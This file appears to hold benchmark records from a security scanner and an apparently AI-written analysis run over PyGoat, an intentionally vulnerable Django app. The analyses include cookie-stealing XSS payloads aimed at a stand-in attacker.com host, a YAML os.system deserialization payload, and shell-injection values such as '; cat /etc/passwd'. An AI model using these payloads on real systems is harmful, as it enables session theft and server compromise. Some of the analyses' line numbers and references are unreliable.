+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nStored or reflected XSS via the `|safe` filter on `csrf_token` and unsanitized `chal.name`/`chal.description` in a Django/Jinja template. An attacker who controls the `chal.name` or `chal.description` fields (e.g., via a compromised admin panel or insecure challenge creation) can inject malicious scripts that execute in victims’ browsers when they load the challenge page. This compromises session integrity (via cookie theft or CSRF token theft) and enables account takeover or phishing.\n\n## Attack Scenario  \n1. Attacker creates a challenge with `chal.name = \"<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\"` or `chal.description = \"<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>\"`.  \n2. Victim loads `/challenge/<attacker-challenge-name>` — Django renders `{{ chal.name }}` and `{{ chal.description }}` *without* auto-escaping because the template uses `|safe` elsewhere and may have autoescape disabled or inconsistent. Even if autoescape is on, `|safe` on `csrf_token` signals unsafe rendering and may encourage unsafe patterns elsewhere.  \n3. The `csrf_token` value is rendered with `|safe`, which is unnecessary (CSRF tokens are opaque strings and do not require `|safe`) and could leak if the token itself is compromised or manipulated (e.g., via session fixation or misconfigured middleware).  \n4. Malicious script executes in victim’s context, exfiltrating cookies, CSRF tokens, or performing actions on their behalf.  \n\nPost-condition: Attacker steals victim’s session or CSRF token, enabling account takeover or privilege escalation.\n\n## Recommendation  \nPrimary fix: Remove `|safe` from `{{ csrf_token }}` — Django’s CSRF token is a safe string and does not need manual unescaping; auto-escaping is sufficient and safer.  \nRemove `|safe` from `{{ chal.name }}` and `{{ chal.description }}` — instead, ensure these fields are HTML-escaped on output (Django does this by default unless `|safe` is used).  \nIf challenge content must support rich text, sanitize input using a library like `bleach` (Python) with a strict allowlist of tags/attributes before storing, and never trust user-controlled HTML.  \nDefense in depth: Set a strict Content-Security-Policy header (e.g., `default-src 'self'; script-src 'self'`) to mitigate XSS impact even if injection occurs.  \nReferences: CWE-79, OWASP A3:2017, SWC-135",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0017",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/templates/Lab/XSS/xss_lab_2.html",
+  "line": 20,
+  "end_line": 20,
+  "rule_id": "template-django-jinja-safe-filter",
+  "cwe": "CWE-79",
+  "scanner_message": "Template variable rendered with the `|safe` filter (Django/Jinja) — this disables auto-escaping and yields stored/reflected XSS if the value is user-controlled. Remove `|safe`; escape on output.",
+  "snippet": "</form>\n<br>\n<p>Hello, {{ username|safe }}</p>\n<script>\n  function setCookie(name, value) {",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nStored/reflected XSS via the `|safe` filter on the `username` template variable in `introduction/templates/Lab/XSS/xss_lab_2.html`. An attacker can inject arbitrary JavaScript (e.g., `<script>alert(1)</script>`) through the `username` POST parameter, which executes in the victim’s browser when the page renders. This compromises session integrity (cookie theft via `document.cookie`), enables account takeover if cookies contain auth tokens, and violates the confidentiality and integrity of user sessions.\n\n## Attack Scenario\n1. Attacker submits a POST request to `/xssL2` with `username=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`.\n2. The Django view (not shown, but implied by form action `/xssL2`) stores or reflects this value back into the template without sanitization.\n3. In `xss_lab_2.html`, line 18 renders `{{ username|safe }}`, bypassing Django’s auto-escaping.\n4. Victim loads the page; the injected script executes in their browser context.\n5. Attacker receives victim’s cookies (including CSRF token and session ID) via their server logs.\n\n## Recommendation\nPrimary fix: Remove the `|safe` filter from `{{ username }}` on line 18 of `xss_lab_2.html`. Django auto-escapes by default; the filter is unnecessary and dangerous unless the value is *known* safe (e.g., pre-sanitized HTML). Replace with `{{ username }}`.\n\nDefense in depth: Sanitize user input server-side using `django.utils.html.escape()` or `bleach` before storage if rich HTML is required; enforce a strict Content Security Policy (CSP) header to mitigate script execution.\n\nReferences: CWE-79, OWASP A3:2017, SWC-135",
+  "documented_entries_for_this_file": [
+   {
+    "id": "XSS Stored (Lab2 template)",
+    "file": "introduction/templates/Lab/XSS/xss_lab_2.html",
+    "category": "xss"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0074",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/mitre.py",
+  "line": 176,
+  "end_line": 189,
+  "rule_id": "no-csrf-exempt",
+  "cwe": [
+   "CWE-352: Cross-Site Request Forgery (CSRF)"
+  ],
+  "scanner_message": "Detected usage of @csrf_exempt, which indicates that there is no CSRF token set for this route. This could lead to an attacker manipulating the user's account and exfiltration of private data. Instead, create a function without this decorator.",
+  "snippet": "            return redirect('/mitre/9/lab/login')\n\n@authentication_decorator\n@csrf_exempt\ndef csrf_transfer_monei(request):\n    if request.method == 'GET':\n        try:\n            cookie = request.COOKIES['auth_cookiee']\n            payload = jwt.decode(cookie, 'csrf_vulneribility', algorithms=['HS256'])\n            username = payload['username']\n            User = CSRF_user_tbl.objects.filter(username=username)\n            if not User:\n                redirect('/mitre/9/lab/login')\n            return render(request, 'mitre/csrf_dashboard.html', {'balance': User[0].balance})\n        except:\n            return redirect('/mitre/9/lab/login')\n\ndef csrf_transfer_monei_api(request,recipent,amount):",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nAn attacker can forge authenticated requests to the `csrf_transfer_monei` and `csrf_transfer_monei_api` endpoints, bypassing Django’s CSRF protection due to the `@csrf_exempt` decorator. This allows unauthorized fund transfers (via `csrf_transfer_monei_api`) or account manipulation (e.g., reading balances via `csrf_transfer_monei`) by tricking authenticated users into visiting a malicious page that submits POST/GET requests to these endpoints — effectively exfiltrating private data (balance) and enabling unauthorized state changes.\n\n## Attack Scenario  \n1. A victim is logged in and holds a valid JWT cookie (`auth_cookiee`) issued by `csrf_lab_login` (line 1–15 in `introduction/mitre.py`).  \n2. The attacker crafts a malicious page (e.g., via phishing) that triggers an HTTP request to `/mitre/9/lab/transaction` (the route for `csrf_transfer_monei`) or `/mitre/9/lab/transfer/<recipient>/<amount>` (for `csrf_transfer_monei_api`).  \n3. Because `csrf_transfer_monei` is decorated with `@csrf_exempt` (line 12 in `introduction/playground/A9/main.py`), Django skips CSRF validation, and the request is processed with the victim’s credentials (cookie).  \n4. If the attacker knows or guesses the recipient and amount, they can call `csrf_transfer_monei_api(request, recipient, amount)` (line 17+ in `introduction/playground/A9/main.py`) and cause a transfer out of the victim’s account.  \n5. Even without knowing the amount, the attacker can trigger `csrf_transfer_monei` (GET) to read the victim’s balance and exfiltrate it via side channels.  \n\nPost-condition: Unauthorized read or write access to the victim’s account state, violating confidentiality and integrity.\n\n## Recommendation  \nPrimary fix: Remove `@csrf_exempt` from `csrf_transfer_monei` and `csrf_transfer_monei_api`. Add proper CSRF protection using Django’s `{% csrf_token %}` in forms or `@csrf_protect` decorator, and ensure all state-changing endpoints use POST with CSRF validation. For API endpoints, use token-based authentication (e.g., Django REST Framework’s `SessionAuthentication` + `CSRFCheck`) instead of JWT cookies alone.  \n\nDefense in depth: Migrate away from JWT-in-cookie for session-like behavior; use Django’s built-in session framework or secure, HttpOnly, SameSite=Strict cookies. Enforce SameSite cookie policy on `auth_cookiee`.  \n\nReferences: CWE-352, OWASP A01:2021, SWC-116",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0054",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "dockerized_labs/insec_des_lab/main.py",
+  "line": 36,
+  "end_line": 36,
+  "rule_id": "avoid-pickle",
+  "cwe": [
+   "CWE-502: Deserialization of Untrusted Data"
+  ],
+  "scanner_message": "Avoid using `pickle`, which is known to lead to code execution vulnerabilities. When unpickling, the serialized data could be manipulated to run arbitrary code. Instead, consider serializing the relevant data as JSON or a similar text-based serialization format.",
+  "snippet": "        decoded_data = base64.b64decode(serialized_data)\n        # Intentionally vulnerable deserialization, matching PyGoat\n        user = pickle.loads(decoded_data)\n        \n        if isinstance(user, User):",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can achieve remote code execution (RCE) by crafting a malicious pickle payload and submitting it via the `deserialize_data` endpoint in `dockerized_labs/insec_des_lab/main.py`. The endpoint accepts base64-encoded serialized data from `request.form['serialized_data']`, decodes it, and passes it directly to `pickle.loads()` without validation. This violates the integrity and availability of the application, allowing arbitrary code execution as the application user (e.g., reading sensitive files, exfiltrating environment variables, or pivoting to internal services).\n\n## Attack Scenario\n1. Attacker constructs a malicious pickle payload that, when unpickled, executes arbitrary code (e.g., via `os.system`, `subprocess`, or `__reduce__`-based gadget chains like `os.system('whoami')`).\n2. Attacker base64-encodes the payload and submits it as the `serialized_data` form field to the `deserialize_data` endpoint (line 5 in `dockerized_labs/insec_des_lab/main.py`).\n3. The endpoint decodes the data (line 4) and calls `pickle.loads(decoded_data)` (line 6), which triggers payload execution during deserialization.\n4. The attacker’s code runs with the privileges of the web application process, achieving full RCE.\n\n## Recommendation\nPrimary fix: Replace `pickle.loads()` with a safe deserialization mechanism such as JSON (`json.loads`) or a purpose-built serializer like `msgpack` with strict type restrictions. If legacy pickle compatibility is required, use `pickle.Unpickler` with a custom `find_class` that only allows whitelisted, safe types (e.g., `builtins.int`, `builtins.str`) — but this is discouraged.\n\nDefense in depth: Sanitize and validate all user-provided serialized data; log deserialization attempts; restrict `deserialize_data` to admin-only access via authentication and authorization checks (currently missing — see `deserialize_data` has no auth guard).\n\nReferences: CWE-502, OWASP A8:2021, SWC-117",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0033",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "dockerized_labs/insec_des_lab/main.py",
+  "line": 36,
+  "end_line": 36,
+  "rule_id": "insecure-deserialization",
+  "cwe": [
+   "CWE-502: Deserialization of Untrusted Data"
+  ],
+  "scanner_message": "Detected the use of an insecure deserialization library in a Flask route. These libraries are prone to code execution vulnerabilities. Ensure user data does not enter this function. To fix this, try to avoid serializing whole objects. Consider instead using a serializer such as JSON.",
+  "snippet": "        decoded_data = base64.b64decode(serialized_data)\n        # Intentionally vulnerable deserialization, matching PyGoat\n        user = pickle.loads(decoded_data)\n        \n        if isinstance(user, User):",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can achieve remote code execution (RCE) by crafting a malicious pickle payload and submitting it via the `deserialize_data` route in `dockerized_labs/insec_des_lab/main.py`. The route directly deserializes untrusted base64-decoded data using `pickle.loads`, which is known to allow arbitrary code execution via `__reduce__`-based gadget chains. This exposes the application to full server compromise, including reading sensitive files, executing shell commands, and exfiltrating credentials — specifically, the secret `ADMIN_KEY_123` is leaked to authenticated admins, but the RCE itself does not require authentication.\n\n## Attack Scenario\n1. Attacker constructs a malicious pickle payload using a gadget chain (e.g., `os.system` or `subprocess.Popen`) wrapped in a class implementing `__reduce__` (e.g., `os.system('whoami')`).\n2. Attacker base64-encodes the payload and submits it as the `serialized_data` form field to the `deserialize_data` endpoint (line 2–3 in `dockerized_labs/insec_des_lab/main.py`).\n3. The endpoint decodes the base64 string (line 3) and passes it to `pickle.loads` (line 4), which triggers deserialization and executes the embedded payload during object reconstruction.\n4. The payload executes on the server, granting the attacker arbitrary command execution — e.g., reading `/etc/passwd`, uploading a reverse shell, or dumping the database.\n\n## Recommendation\n**Primary fix**: Replace `pickle.loads` with a safe deserialization mechanism such as `json.loads`. Since the code only checks `isinstance(user, User)`, the `User` object can be replaced with a dictionary or a JSON-serializable schema (e.g., `{\"username\": str, \"is_admin\": bool}`).  \n**Defense in depth**: Enforce strict input validation, restrict deserialization to signed/encrypted payloads with HMAC verification, and apply principle of least privilege to the application runtime (e.g., non-root container user).  \n**References**: CWE-502, OWASP A8:2021, SWC-602",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0044",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 560,
+  "end_line": 560,
+  "rule_id": "avoid-insecure-deserialization",
+  "cwe": [
+   "CWE-502: Deserialization of Untrusted Data"
+  ],
+  "scanner_message": "Avoid using insecure deserialization library, backed by `pickle`, `_pickle`, `cpickle`, `dill`, `shelve`, or `yaml`, which are known to lead to remote code execution vulnerabilities.",
+  "snippet": "                file=request.FILES[\"file\"]\n                try :\n                    data = yaml.load(file,yaml.Loader)\n                    \n                    return render(request,\"Lab/A9/a9_lab.html\",{\"data\":data})",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can achieve remote code execution (RCE) by uploading a malicious YAML file to the `a9_lab` view in `introduction/views.py`. The use of `yaml.load(file, yaml.Loader)` (line 12) with PyYAML's `Loader` class does not prevent arbitrary Python object instantiation — specifically, it allows construction of objects like `!!python/object/new:os.system` that execute arbitrary shell commands during deserialization. This directly violates data integrity and availability, and enables full server compromise.\n\n## Attack Scenario\n1. Attacker crafts a YAML payload containing a dangerous tag, e.g.:\n   ```yaml\n   !!python/object/new:os.system\n   args: [\"whoami > /tmp/pwned\"]\n   ```\n2. Attacker submits a POST request to `/a9_lab` with the malicious YAML file in `request.FILES[\"file\"]`.\n3. In `introduction/views.py::a9_lab`, line 12 executes `yaml.load(file, yaml.Loader)`, which parses the YAML and instantiates the `os.system` callable.\n4. The deserialized object is stored in `data`, and rendered in the template `Lab/A9/a9_lab.html`, but crucially, the object’s constructor or `__init__` may already have executed the command during deserialization — PyYAML instantiates objects *before* rendering, so command execution occurs at line 12, not during template rendering.\n5. Post-condition: arbitrary shell command executes on the server with the application’s privileges.\n\n## Recommendation\nPrimary fix: Replace `yaml.load(file, yaml.Loader)` with `yaml.safe_load(file)` (line 12 in `introduction/views.py`). `safe_load` only constructs standard YAML types and blocks arbitrary Python object instantiation, eliminating the RCE vector.\n\nDefense in depth: \n- Validate uploaded file extensions and MIME types server-side (e.g., restrict to `.txt` or `.json` if YAML is not strictly required).\n- Sanitize or reject non-JSON/YAML content in production if deserialization is unnecessary.\n\nReferences: CWE-502, OWASP A8:2021 (Insecure Deserialization), PyYAML security advisory (CVE-2020-14343, CVE-2020-1747)",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0003",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 430,
+  "end_line": 434,
+  "rule_id": "python-subprocess-shell-true",
+  "cwe": "CWE-78",
+  "scanner_message": "subprocess/os.system invoking a shell with a built command string. User-controlled components give OS command injection. Pass an argv list and shell=False.",
+  "snippet": "            try:\n                # output=subprocess.check_output(command,shell=True,encoding=\"UTF-8\")\n                process = subprocess.Popen(\n                    command,\n                    shell=True,\n                    stdout=subprocess.PIPE, \n                    stderr=subprocess.PIPE)\n                stdout, stderr = process.communicate()\n                data = stdout.decode('utf-8')",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn unauthenticated attacker can execute arbitrary OS commands on the server by injecting shell metacharacters into the `domain` POST parameter in the `cmd_lab` function (introduction/views.py:12–31). Because `subprocess.Popen` is invoked with `shell=True` and a user-controlled string (`command = \"dig {}\".format(domain)`), an input like `example.com; cat /etc/passwd` results in full command execution. This compromises Confidentiality (arbitrary file reads), Integrity (file modification, backdoor installation), and Availability (service termination, DoS).\n\n## Attack Scenario\n1. Attacker sends a POST request to `/cmd_lab` with `domain` set to `example.com; rm -rf /tmp/pwned` (or any malicious command).\n2. In `cmd_lab` (introduction/views.py:19), `domain` is stripped of protocol prefixes but not sanitized for shell metacharacters (`;`, `|`, `&`, `$()`, backticks, etc.).\n3. Line 22–23 constructs `command = \"dig example.com; rm -rf /tmp/pwned\"`.\n4. Line 27–31 invokes `subprocess.Popen(command, shell=True, ...)`, causing the shell to execute both `dig example.com` and `rm -rf /tmp/pwned`.\n5. Attacker receives command output in the rendered HTML, confirming arbitrary command execution.\n\n## Recommendation\nPrimary fix: Replace `shell=True` with `shell=False` and pass arguments as a list: `subprocess.Popen([\"dig\", domain], ...)` (or `[\"nslookup\", domain]` for Windows). Validate `domain` against a strict allowlist (e.g., `^[a-zA-Z0-9.-]+$`) before use. Defense in depth: Sanitize input with Django’s `validate_ipv4_address`/`validate_ipv6_address` or a custom regex, and restrict command execution via a dedicated service account with minimal privileges. References: CWE-78, OWASP A03:2021, SWC-132.",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0001",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/templates/Lab/XSS/xss_lab.html",
+  "line": 27,
+  "end_line": 27,
+  "rule_id": "template-django-jinja-safe-filter",
+  "cwe": "CWE-79",
+  "scanner_message": "Template variable rendered with the `|safe` filter (Django/Jinja) — this disables auto-escaping and yields stored/reflected XSS if the value is user-controlled. Remove `|safe`; escape on output.",
+  "snippet": "    <h3>About : <i>{{about}}</i></h3>\n    {% elif query %}\n    <h3> The company '{{query|safe}}' You searched for is not Part of FAANG</h3>\n    {% else %}",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nStored or reflected XSS via the `query` parameter in `xss_lab.html` — an attacker can inject arbitrary JavaScript that executes in victims' browsers when the search term is rendered with the `|safe` filter, compromising confidentiality (session theft, credential harvesting) and integrity (DOM manipulation, phishing). The vulnerable asset is the unescaped user input `{{query|safe}}` on line 27 of `introduction/templates/Lab/XSS/xss_lab.html`.\n\n## Attack Scenario\n1. An attacker crafts a malicious URL such as `/xssL1?q=<script>alert(1)</script>` (or a more dangerous payload like `<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>`).\n2. The Django view (not shown, but implied by the `action=\"/xssL1\"` form) reads the `q` query parameter and passes it as `query` to the template context without escaping.\n3. In `xss_lab.html`, line 27 renders `{{query|safe}}`, bypassing Django’s auto-escaping and injecting the script into the DOM.\n4. When a victim visits the URL, the script executes in their browser context, enabling session hijacking, keylogging, or UI redressing.\n\n## Recommendation\nPrimary fix: Remove the `|safe` filter from `{{query}}` on line 27 of `xss_lab.html`; Django will auto-escape the variable by default, neutralizing the XSS.  \nDefense in depth: Sanitize and validate all user inputs server-side (e.g., using `django.utils.html.escape` or `mark_safe` only after explicit sanitization with `bleach.clean`), and deploy a strict Content Security Policy (CSP) header to mitigate residual XSS.  \nReferences: CWE-79, OWASP A3:2017, SWC-135",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0071",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/templates/Lab/A9/a9_lab2.html",
+  "line": 91,
+  "end_line": 91,
+  "rule_id": "var-in-script-tag",
+  "cwe": [
+   "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+  ],
+  "scanner_message": "Detected a template variable used in a script tag. Although template variables are HTML escaped, HTML escaping does not always prevent cross-site scripting (XSS) attacks when used directly in JavaScript. If you need this data on the rendered page, consider placing it in the HTML portion (outside of a script tag). Alternatively, use a JavaScript-specific encoder, such as the one available in OWASP ESAPI. For Django, you may also consider using the 'json_script' template tag and retrieving the data in your script by using the element ID (e.g., `document.getElementById`).",
+  "snippet": "    }\n    {% if error %}\n    alert(\"{{ data }}\");\n    {% endif %}",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nAn attacker can inject arbitrary JavaScript into the `alert()` call in `introduction/templates/Lab/A9/a9_lab2.html` via the `data` template variable, which is populated directly from `request.POST.get(\"function\")` without sanitization or encoding. Since the variable is embedded inside a `<script>` tag, HTML escaping alone is insufficient to prevent XSS. This allows full compromise of the user's session (e.g., stealing cookies, performing actions on their behalf, or exfiltrating sensitive data) when a victim loads the page after submitting a malicious `function` parameter.\n\n## Attack Scenario  \n1. Attacker crafts a POST request to `/a9/lab2` with `function` field set to `\"); malicious_payload(); //`, where `malicious_payload()` is arbitrary JS (e.g., `fetch('https://attacker.com/steal?c='+document.cookie)`).  \n2. The backend catches an exception (e.g., invalid `function_str` passed to `ImageMath.eval`) and renders the template with `{\"data\": \"Error\", \"error\": True}` — but if the attacker controls the `function` input, they can inject JS that bypasses the error message.  \n3. In the template, `alert(\"{{ data }}\");` renders as `alert(\"\"); malicious_payload(); //\");`, executing the payload in the victim’s browser.  \n4. The payload runs in the context of the vulnerable page, enabling session hijacking or CSRF.  \n\n## Recommendation  \nPrimary fix: Use a JavaScript-safe encoder for the `data` variable inside `<script>` blocks. In Django, replace `{{ data }}` with `{{ data|escapejs }}` or use the `json_script` template tag as recommended by the Semgrep message.  \nDefense in depth: Sanitize and validate the `function` input server-side before passing it to `ImageMath.eval`, and apply Content Security Policy (CSP) headers to restrict inline script execution.  \nReferences: CWE-79, OWASP A3:2017, SWC-107",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0085",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 341,
+  "end_line": 381,
+  "rule_id": "no-csrf-exempt",
+  "cwe": [
+   "CWE-352: Cross-Site Request Forgery (CSRF)"
+  ],
+  "scanner_message": "Detected usage of @csrf_exempt, which indicates that there is no CSRF token set for this route. This could lead to an attacker manipulating the user's account and exfiltration of private data. Instead, create a function without this decorator.",
+  "snippet": "    else:\n        return redirect('login')\n@csrf_exempt\ndef ba_lab(request):\n    if request.user.is_authenticated:\n        name = request.POST.get('name')\n        password = request.POST.get('pass')\n        if name:\n            if request.COOKIES.get('admin') == \"1\":\n                return render(\n                    request, \n                    'Lab/BrokenAccess/ba_lab.html', \n                    {\n                        \"data\":\"0NLY_F0R_4DM1N5\",\n                        \"username\": \"admin\"\n                    })\n            elif login.objects.filter(user='admin',password=password):\n                html = render(\n                    request, \n                    'Lab/BrokenAccess/ba_lab.html', \n                    {\n                        \"data\":\"0NLY_F0R_4DM1N5\",\n                        \"username\": \"admin\"\n                    })\n                html.set_cookie(\"admin\", \"1\",max_age=200)\n                return html\n            elif login.objects.filter(user=name,password=password):\n                html = render(\n                request, \n                'Lab/BrokenAccess/ba_lab.html', \n                {\n                    \"not_admin\":\"No Secret key for this User\",\n                    \"username\": name\n                })\n                html.set_cookie(\"admin\", \"0\",max_age=200)\n                return html\n            else:\n                return render(request, 'Lab/BrokenAccess/ba_lab.html', {\"data\": \"User Not Found\"})\n\n        else:\n            return render(request,'Lab/BrokenAccess/ba_lab.html',{\"no_creds\":True})\n    else:\n        return redirect('login')\n\n#********************************************************Sensitive Data Exposure*****************************************************#",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nThe `ba_lab` view in `introduction/views.py` is decorated with `@csrf_exempt`, disabling Django’s CSRF protection. This allows an attacker to craft malicious requests (e.g., via a phishing page or embedded image tag) that trick authenticated admin users into submitting POST requests to `ba_lab`, potentially granting the attacker admin-level access by exploiting the hardcoded credential check (`login.objects.filter(user='admin',password=password)`) and setting the `\"admin\"` cookie to `\"1\"`. The secret `\"0NLY_F0R_4DM1N5\"` is exposed to any attacker who successfully impersonates an admin session, violating integrity and confidentiality of sensitive data.\n\n## Attack Scenario  \n1. An authenticated admin user visits a malicious site controlled by the attacker (e.g., via phishing link or compromised ad network).  \n2. The malicious site sends a POST request to `/ba_lab` with `name=admin` and a guessed/common password (e.g., `\"password123\"`), leveraging the fact that the view accepts any password for the admin user due to the flawed `login.objects.filter(user='admin',password=password)` check — this is vulnerable to SQL injection or default credentials (see `ba_lab` line 12–17).  \n3. Because `@csrf_exempt` is present (line 10), Django does not validate a CSRF token, so the request succeeds.  \n4. The server responds with a `Set-Cookie: admin=1` header (line 16), granting the attacker’s browser admin status.  \n5. On subsequent requests to `/ba_lab`, the attacker’s browser sends `admin=1`, and the view returns the secret `\"0NLY_F0R_4DM1N5\"` (line 13–15).  \n6. The attacker now has access to admin-only data without needing the real admin password.\n\n## Recommendation  \n**Primary fix**: Remove `@csrf_exempt` and ensure all state-changing views use Django’s CSRF middleware (enabled by default). Replace the flawed credential check with proper authentication using Django’s `authenticate()` and `login()` APIs, and avoid storing sensitive secrets in template context or cookies.  \n\n**Defense in depth**:  \n- Enforce CSRF tokens on all POST endpoints via `{% csrf_token %}` in forms and `@csrf_protect` decorator where needed.  \n- Use Django’s `LoginView` and `AuthenticationForm` instead of custom credential handling.  \n- Sanitize and validate all user inputs; avoid raw database queries with `filter(user=..., password=...)` — this pattern is vulnerable to SQL injection and credential bypass.  \n\n**References**: CWE-352, OWASP A01:2021, SWC-127",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0099",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 738,
+  "end_line": 743,
+  "rule_id": "no-csrf-exempt",
+  "cwe": [
+   "CWE-352: Cross-Site Request Forgery (CSRF)"
+  ],
+  "scanner_message": "Detected usage of @csrf_exempt, which indicates that there is no CSRF token set for this route. This could lead to an attacker manipulating the user's account and exfiltration of private data. Instead, create a function without this decorator.",
+  "snippet": "###################################################### 2021 A1: Broken Access\n\n@csrf_exempt\ndef a1_broken_access(request):\n    if not request.user.is_authenticated:\n        return redirect('login')\n    \n    return render(request,\"Lab_2021/A1_BrokenAccessControl/broken_access.html\")",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nThe `@csrf_exempt` decorator on `a1_broken_access` (introduction/views.py) disables Django’s CSRF protection for that view, allowing unauthenticated attackers to forge POST/GET requests on behalf of authenticated users. This enables account manipulation (e.g., triggering state changes via POST), data exfiltration (e.g.,诱使 users submit sensitive data to attacker-controlled endpoints), and bypass of the intended access-control boundary — specifically, the view is protected only by `request.user.is_authenticated`, but CSRF tokens are the only defense against cross-origin state changes. The invariant at risk is: *authenticated user actions must be initiated via verified, same-origin requests*.\n\n## Attack Scenario  \n1. Attacker crafts a malicious HTML page containing a hidden `<form>` targeting `http://vulnerable-site/a1_broken_access` with method POST and hidden fields (e.g., `?next=/admin` or arbitrary payload).  \n2. Attacker lures an authenticated victim (with active session cookie) to visit the malicious page (e.g., via phishing link or compromised third-party site).  \n3. Victim’s browser automatically includes the session cookie, and because `@csrf_exempt` disables CSRF middleware validation, Django processes the request as legitimate (introduction/views.py:2, line `@csrf_exempt`).  \n4. The view renders or modifies state (e.g., redirects, logs, or triggers side effects) based on forged input, enabling account takeover via forced navigation, session fixation, or诱导 submission of sensitive data.  \nPost-condition: Attacker successfully executes privileged actions on behalf of the victim without their knowledge or consent.\n\n## Recommendation  \nPrimary fix: Remove `@csrf_exempt` and ensure the view uses Django’s CSRF middleware (default in `MIDDLEWARE`), and include `{% csrf_token %}` in any forms or use `@require_POST` + `@csrf_protect` explicitly if needed. 